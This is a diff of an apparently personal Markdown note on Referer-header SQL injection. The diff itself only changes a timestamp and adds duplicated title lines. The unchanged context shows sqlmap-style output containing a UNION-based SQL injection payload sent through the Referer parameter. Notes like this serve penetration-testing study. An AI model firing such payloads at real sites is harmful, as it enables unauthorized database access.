@@ -3,7 +3,7 @@ title: Refer注入
 date: 2024-11-24T00:02:16Z
 lastmod: 2024-11-24T00:52:58Z
 created: 2024-11-27T22:18
-updated: 2024-12-14T19:10
+updated: 2024-12-14T19:12
 ---
 
 # Refer注入
@@ -29,6 +29,8 @@ Parameter: Referer (Referer)
     Title: Generic UNION query (random number) - 2 columns
     Payload: -5848 UNION ALL SELECT CONCAT(0x7171787a71,0x6543727846745555584e4546736d6442655a6c63646a786c626d6f634b6e6f4c43554a6a4b746676,0x7170787871),3313-- -
 tags: [web渗透]
+title: Refer注入
+title: Refer注入
 ---
 ```
 
